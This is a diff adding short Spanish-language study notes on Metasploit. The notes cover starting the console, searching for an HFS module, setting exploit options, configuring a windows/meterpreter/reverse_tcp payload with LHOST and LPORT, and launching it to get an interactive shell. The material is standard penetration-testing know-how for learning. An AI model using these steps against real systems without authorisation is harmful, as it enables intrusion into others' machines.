@@ -1,0 +1,31 @@
+1 = Como arrancar Metasploit
+
+    msfdb run = Primer comando si nunca hemos abierto metasploit 
+
+2 = Buscar en la consola de metasploit 
+
+    search hfs
+
+3 = Como utulizar un exploit
+
+    use /path_del_Exploit
+
+4 = Comandos dentro de un exploit:
+
+    info = Nos muestra el codigo de el exploit 
+    show options = Nos muestra los parámetros 
+    set parámetro = Introducir la información requerida
+
+5 = Crear un listener, es decir un puerto en escucha para recibir la shell
+
+    * set payload windows/meterpreter/reverse_tcp
+        * En los parámetros de el exploit nos aparecera lkas opciones del payload, deberemos configurar:
+
+            LHOST = Nuestra ip
+            LPORT = Puerto desde el cual queremos escuchar
+
+6 = Iniciar exploit
+
+    exploit 
+
+7 = Escribiendo shell en meterpreter adquirimos una consola interactiva
